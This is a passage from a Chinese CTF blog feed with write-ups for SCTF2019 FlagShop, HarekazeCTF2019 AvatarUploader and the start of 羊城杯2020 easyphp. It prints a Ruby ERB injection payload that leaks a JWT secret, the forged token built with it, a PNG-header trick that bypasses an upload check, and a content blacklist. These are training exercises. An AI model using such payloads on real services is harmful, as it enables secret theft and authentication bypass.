cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br> <br>  <span class="hljs-keyword">if</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;jkl&quot;</span>] &lt; <span class="hljs-variable constant_">FLAGPRICE</span> <span class="hljs-keyword">then</span><br> <br>    json(&#123;<span class="hljs-symbol">title:</span> <span class="hljs-string">&quot;error&quot;</span>,<span class="hljs-symbol">message:</span> <span class="hljs-string">&quot;no enough jkl&quot;</span>&#125;)<br>  <span class="hljs-keyword">else</span><br> <br>    auth &lt;&lt; &#123;<span class="hljs-symbol">flag:</span> <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;FLAG&quot;</span>]&#125;<br>    auth = <span class="hljs-variable constant_">JWT</span>.encode auth,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>    cookies[<span class="hljs-symbol">:auth</span>] = auth<br>    json(&#123;<span class="hljs-symbol">title:</span> <span class="hljs-string">&quot;success&quot;</span>,<span class="hljs-symbol">message:</span> <span class="hljs-string">&quot;jkl is good thing&quot;</span>&#125;)<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">islogin</span><br>  <span class="hljs-keyword">if</span> cookies[<span class="hljs-symbol">:auth</span>].<span class="hljs-literal">nil</span>? <span class="hljs-keyword">then</span><br>    redirect to(<span class="hljs-string">&#x27;/shop&#x27;</span>)<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>代码审计后主要看&#x2F;work这段代码</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">if</span> params<span class="hljs-selector-attr">[:do]</span> == <span class="hljs-string">&quot;#&#123;params[:name][0,7]&#125; is working&quot;</span> then<br> <br>  auth<span class="hljs-selector-attr">[<span class="hljs-string">&quot;jkl&quot;</span>]</span> = auth<span class="hljs-selector-attr">[<span class="hljs-string">&quot;jkl&quot;</span>]</span><span class="hljs-selector-class">.to_i</span> + SecureRandom<span class="hljs-selector-class">.random_number</span>(<span class="hljs-number">10</span>)<br>  auth = JWT<span class="hljs-selector-class">.encode</span> auth,ENV<span class="hljs-selector-attr">[<span class="hljs-string">&quot;SECRET&quot;</span>]</span> , <span class="hljs-string">&#x27;HS256&#x27;</span><br>  cookies<span class="hljs-selector-attr">[:auth]</span> = auth<br>  ERB::<span class="hljs-built_in">new</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result<br></code></pre></td></tr></table></figure><p>条件，也就是<code>params[:do]</code> 是否等于 <code>params[:name][0,7] + &quot; is working&quot;</code>。</p><p>但是弹窗没有任何有用的信息，看了部分大佬的wp知道了原来是涉及了一个ruby模块注入。Ruby全局变量汇总，<a href="https://blog.csdn.net/zdq0394123/article/details/8443694">Ruby全局变量汇总</a>，<a href="https://www.runoob.com/ruby/ruby-tutorial.html">ruby教程</a>，<a href="https://www.anquanke.com/post/id/86867">手把手教你ruby模块注入</a></p><p>我们要通过&lt;%&#x3D;%&gt;进行模板注入，弹窗代码<code>&#123;params[:name][0,7]&#125;</code>使我们只能在模块中再进行2个字符的输入，也就是说我们不能够直接输入SECRET来得到我们的密钥，所以就需要用到Ruby的预定义字符了。</p><p>如果没有限制长度，可以直接输出ENV[“SECRET”]</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">/work?SECRET=&amp;name=&lt;%= ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] %&gt;&amp;<span class="hljs-keyword">do</span>=&lt;%= ENV[<span class="hljs-string">&quot;SECRET&quot;</span>] %&gt; is working<br></code></pre></td></tr></table></figure><p>但是这里限制长度了，可以使用$‘，因为前面 <code>if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</code>对ENV[‘SECRET’]进行了正则匹配，所以$’输出的就是ENV[“SECRET”]的值</p><p>$’ 最后一次模式匹配中匹配部分之后的字符串</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">/work?SECRET=&amp;name=&lt;%=$&#x27;%&gt;&amp;<span class="hljs-keyword">do</span>=&lt;%=$&#x27;%&gt; is working<br></code></pre></td></tr></table></figure><p>这里需要传一个空的SECRET是为了可以搜索SECRET参数内容，然后使 &lt;%&#x3D;$’%&gt;返回最后一次匹配的字符串是我们的密钥。</p><p>但是不能直接传入要先进行一次url编码</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?SECRET=&amp;name=%3C%25%3D%24%27%25%3E&amp;<span class="hljs-keyword">do</span>=%3C%25%3D%24%27%25%3E%20is%20working<br></code></pre></td></tr></table></figure><p>抓work的包然后修改。发送查看响应包发现成功拿到密钥。</p><p><img src="/../image/SCTF2019-FlagShop-4.png"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">4</span>eb<span class="hljs-number">7215558</span>d<span class="hljs-number">02</span>d<span class="hljs-number">53</span>f<span class="hljs-number">8</span>f<span class="hljs-number">5530</span>a<span class="hljs-number">6173</span><span class="hljs-keyword">c</span><span class="hljs-number">91905448</span>d<span class="hljs-number">8</span>a<span class="hljs-number">4</span>d<span class="hljs-number">70566080</span>f<span class="hljs-number">68</span>db<span class="hljs-number">14025</span>f<span class="hljs-number">8</span>f<span class="hljs-number">00</span>ba<span class="hljs-number">79</span>ca<span class="hljs-number">763</span>bf<span class="hljs-number">909</span>fad<span class="hljs-number">17108621250</span>ff<span class="hljs-number">2150</span>f<span class="hljs-number">04503e9</span>b<span class="hljs-number">447061149076</span>a<span class="hljs-number">55</span>a<span class="hljs-number">6</span>fe<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>密钥拿到了，然后直接进行jkl的修改使其达到能购买flag。</p><p><img src="/../image/SCTF2019-FlagShop-5.png"></p><p>得到jwt即payload：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">eyJhbGciOiJIUzI<span class="hljs-number">1</span><span class="hljs-symbol">NiJ9</span>.eyJ<span class="hljs-number">1</span>aWQiOiI<span class="hljs-number">1</span>MjEyMjc<span class="hljs-number">0</span>My<span class="hljs-number">00</span>MWE<span class="hljs-number">4</span>LTRm<span class="hljs-symbol">NjgtYWVlMy0</span>wZDA<span class="hljs-number">4</span><span class="hljs-symbol">NjkyOTljNjYiLCJqa2</span>wiOjFlKzI<span class="hljs-number">3</span>fQ.p<span class="hljs-number">2</span>mR_l<span class="hljs-number">3</span>eFdiUakt<span class="hljs-number">8</span>Z<span class="hljs-number">0</span>vFemkYsUsTLd<span class="hljs-number">1</span>DqcK<span class="hljs-name">G8</span>gQaukM<br></code></pre></td></tr></table></figure><p>回到&#x2F;shop点击buy flag然后抓包修改jwt，然后会返回一个新的Cookie，也是jwt格式，base64解码就是flag，这里只要解压前两段即可</p><p><img src="/../image/SCTF2019-FlagShop-6.png"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">eyJhbGciOiJIUzI<span class="hljs-number">1</span><span class="hljs-symbol">NiJ9</span>.W<span class="hljs-number">3</span>sidWlkIjoi<span class="hljs-symbol">NTIxMjI3</span><span class="hljs-symbol">NDMtNDFhOC00</span>ZjY<span class="hljs-number">4</span>LWFlZTMtMGQwODY<span class="hljs-number">5</span>Mjk<span class="hljs-number">5</span>YzY<span class="hljs-number">2</span>IiwiamtsIjoxLjBlKzI<span class="hljs-number">3</span>fSx<span class="hljs-number">7</span>ImFsZyI<span class="hljs-number">6</span>IkhTMjU<span class="hljs-number">2</span>I<span class="hljs-symbol">n0</span>seyJmbGF<span class="hljs-symbol">nIjoiZmxhZ3</span>sxYjU<span class="hljs-number">0</span><span class="hljs-symbol">NjlhYy0</span>xZGFmLTQ<span class="hljs-number">4</span><span class="hljs-symbol">N2</span>EtOGIxYi<span class="hljs-number">0</span>xZjZjMzdi<span class="hljs-symbol">N2</span>FhMDF<span class="hljs-number">9</span>I<span class="hljs-symbol">n1</span>d<br></code></pre></td></tr></table></figure><p>base64解码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&#123;&quot;alg&quot;:<span class="hljs-string">&quot;HS256&quot;</span>&#125;<span class="hljs-selector-attr">[&#123;<span class="hljs-string">&quot;uid&quot;</span>:<span class="hljs-string">&quot;52122743-41a8-4f68-aee3-0d0869299c66&quot;</span>,<span class="hljs-string">&quot;jkl&quot;</span>:1.0e+27&#125;,&#123;<span class="hljs-string">&quot;alg&quot;</span>:<span class="hljs-string">&quot;HS256&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;flag&quot;</span>:<span class="hljs-string">&quot;flag&#123;1b5469ac-1daf-487a-8b1b-1f6c37b7aa01&#125;&quot;</span>&#125;]</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> ruby模块注入 </tag>
            
            <tag> jwt伪造 </tag>
            
            <tag> ruby预定义字符 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HarekazeCTF2019-AvatarUploader</title>
      <link href="/2025/04/24/HarekazeCTF2019-AvatarUploader/"/>
      <url>/2025/04/24/HarekazeCTF2019-AvatarUploader/</url>
      
        <content type="html"><![CDATA[<h1 id="HarekazeCTF2019-AvatarUploader"><a href="#HarekazeCTF2019-AvatarUploader" class="headerlink" title="HarekazeCTF2019-AvatarUploader"></a>HarekazeCTF2019-AvatarUploader</h1><p>一打开是一个文件上传页面，并且提示我们传入png文件</p><p><img src="/../image/HarekazeCTF2019-AvatarUploader-1.png"></p><p>试着传webshell上去发现实在没办法，然后看了下wp说是要看源码</p><p>源码：</p><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 关闭错误报告，可能会隐藏一些错误信息，在开发阶段可考虑开启（例如 error_reporting(E_ALL)）</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br> <br><span class="hljs-comment">// 引入配置文件，可能包含一些常量和配置信息</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>); <br><span class="hljs-comment">// 引入工具类文件，可能包含一些常用的工具函数</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/util.php&#x27;</span>); <br><span class="hljs-comment">// 引入会话管理类文件，可能包含安全会话相关的功能</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/session.php&#x27;</span>); <br> <br><span class="hljs-comment">// 创建一个新的 SecureClientSession 对象，使用预定义的 CLIENT_SESSION_ID 和 SECRET_KEY 作为参数</span><br><span class="hljs-variable">$session</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecureClientSession</span>(CLIENT_SESSION_ID, SECRET_KEY); <br> <br><span class="hljs-comment">// 检查是否有文件被上传，如果文件不存在或不是通过 HTTP POST 上传的文件，输出错误信息</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]) ||!<span class="hljs-title function_ invoke__">is_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;No file was uploaded.&#x27;</span>);<br>&#125;<br> <br><span class="hljs-comment">// 检查文件大小，如果文件大小超过 256000 字节，输出错误信息</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">256000</span>) &#123;<br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded file is too large.&#x27;</span>);<br>&#125;<br> <br><span class="hljs-comment">// 检查文件类型</span><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-comment">// 获取文件的 MIME 类型</span><br><span class="hljs-variable">$type</span> = <span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-title function_ invoke__">finfo_close</span>(<span class="hljs-variable">$finfo</span>);<br><span class="hljs-comment">// 如果文件类型不是 image/png，输出错误信息</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$type</span>, [<span class="hljs-string">&#x27;image/png&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded file is not PNG format.&#x27;</span>);<br>&#125;<br> <br><span class="hljs-comment">// 检查文件的宽高</span><br><span class="hljs-variable">$size</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-comment">// 如果文件的宽度或高度大于 256 像素，输出错误信息</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">256</span> || <span class="hljs-variable">$size</span>[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">256</span>) &#123;<br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;Uploaded image is too large.&#x27;</span>);<br>&#125;<br><span class="hljs-comment">// 如果文件的类型不是 IMAGETYPE_PNG，输出错误信息并显示 FLAG1（可能是用于调试或意外情况）</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span>[<span class="hljs-number">2</span>]!== IMAGETYPE_PNG) &#123;<br>  <span class="hljs-comment">// I hope this never happens...</span><br>  <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span>. <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;FLAG1&#x27;</span>). <span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>);<br>&#125;<br> <br><span class="hljs-comment">// 生成一个随机的文件名，使用 bin2hex(random_bytes(4)) 生成一个 8 位的十六进制字符串并添加.png 后缀</span><br><span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">4</span>)). <span class="hljs-string">&#x27;.png&#x27;</span>;<br><span class="hljs-comment">// 将上传的文件移动到 UPLOAD_DIR 目录下，并使用生成的随机文件名</span><br><span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], UPLOAD_DIR. <span class="hljs-string">&#x27;/&#x27;</span>. <span class="hljs-variable">$filename</span>);<br> <br><span class="hljs-comment">// 在会话中存储文件名</span><br><span class="hljs-variable">$session</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;avatar&#x27;</span>, <span class="hljs-variable">$filename</span>);<br><span class="hljs-comment">// 显示一个成功的消息</span><br><span class="hljs-title function_ invoke__">flash</span>(<span class="hljs-string">&#x27;info&#x27;</span>, <span class="hljs-string">&#x27;Your avatar has been successfully updated!&#x27;</span>);<br><span class="hljs-comment">// 重定向到根目录</span><br><span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>);<br></code></pre></td></tr></table></figure><p>我们的最终目的是要通过这个if，使其输出flag</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">if</span> ($size[<span class="hljs-number">2</span>]!== IMAGETYPE_PNG) &#123;<br>  <span class="hljs-comment">// I hope this never happens...</span><br>  <span class="hljs-keyword">error</span>(<span class="hljs-string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span>. <span class="hljs-keyword">getenv</span>(<span class="hljs-string">&#x27;FLAG1&#x27;</span>). <span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>所以这题简单点来说就是，我们传入一个文件，经过finfo_file函数去判断图片类型。必须是image&#x2F;png。</p><p>然后用getimagesize去判断图片大小且图片类型不能是png，这两个函数应该是有什么特性和差异。</p><h2 id="getimagesize函数"><a href="#getimagesize函数" class="headerlink" title="getimagesize函数"></a>getimagesize函数</h2><p>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</p><p>getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。</p><p>返回结果说明</p><ul><li>索引 0 给出的是图像宽度的像素值</li><li>索引 1 给出的是图像高度的像素值</li><li>索引 2 给出的是图像的类型，返回的是数字，其中1 &#x3D; GIF，2 &#x3D; JPG，3 &#x3D; PNG，4 &#x3D; SWF，5 &#x3D; PSD，6 &#x3D; BMP，7 &#x3D; TIFF(intel byte order)，8 &#x3D; TIFF(motorola byte order)，9 &#x3D; JPC，10 &#x3D; JP2，11 &#x3D; JPX，12 &#x3D; JB2，13 &#x3D; SWC，14 &#x3D; IFF，15 &#x3D; WBMP，16 &#x3D; XBM</li><li>索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签</image></li><li>索引 bits 给出的是图像的每种颜色的位数，二进制格式</li><li>索引 channels 给出的是图像的通道值，RGB 图像默认是 3</li><li>索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header(“Content-type: image&#x2F;jpeg”);</li></ul><hr><h2 id="finfo-file函数"><a href="#finfo-file函数" class="headerlink" title="finfo_file函数"></a>finfo_file函数</h2><p>该函数可以检测文件的MIME类型。因为有时候我们只根据文件后缀来判断是不准确的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$finfo</span> = finfo_open(FILEINFO_MIME_TYPE); <br><span class="hljs-variable">$mime</span> = finfo_file(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$savepath</span>); <br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$mime</span>;<br></code></pre></td></tr></table></figure><hr><p>这里有个特性，我们把png图片的数据全部破坏掉，只保留文件头。getimagesize就读取不到它的文件宽高和类型了</p><p>那么就可以绕过getimagesize的判断，而finfo_file照样可以识别出这是个PNG图片，从而得到flag。</p><p>PNG的宽高是由它的文件格式决定的。</p><p><img src="/../image/HarekazeCTF2019-AvatarUploader-2.png"></p><p>网上随便找一张图片，将文件头以外的所有字节删除。</p><p><img src="/../image/HarekazeCTF2019-AvatarUploader-3.png"></p><p>然后上传图片即可拿到flag</p><p><img src="/../image/HarekazeCTF2019-AvatarUploader-4.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> upload </tag>
            
            <tag> getimagesize </tag>
            
            <tag> finfo_file </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>羊城杯2020-easyphp</title>
      <link href="/2025/04/24/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-easyphp/"/>
      <url>/2025/04/24/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-easyphp/</url>
      
        <content type="html"><![CDATA[<h1 id="羊城杯2020-easyphp"><a href="#羊城杯2020-easyphp" class="headerlink" title="羊城杯2020-easyphp"></a>羊城杯2020-easyphp</h1><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;on&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;html&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;type&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;flag&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;upload&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;file&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[^a-z\.]/&quot;</span>, <span class="hljs-variable">$filename</span>) == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span> . <span class="hljs-string">&quot;\nHello, world&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>代码审计</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$files</span> = scandir(&#x27;./&#x27;); </span><br>foreach(<span class="hljs-symbol">$</span><span class="hljs-keyword">files</span> as <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>) &#123;<br>    <span class="hljs-keyword">if</span>(is_file(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>            unlink(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>将当前目录中除了index.php的所有文件删除</p><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;on&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;html&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;type&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;flag&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;upload&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;file&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>对传参content进行黑名单过滤。</p><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title 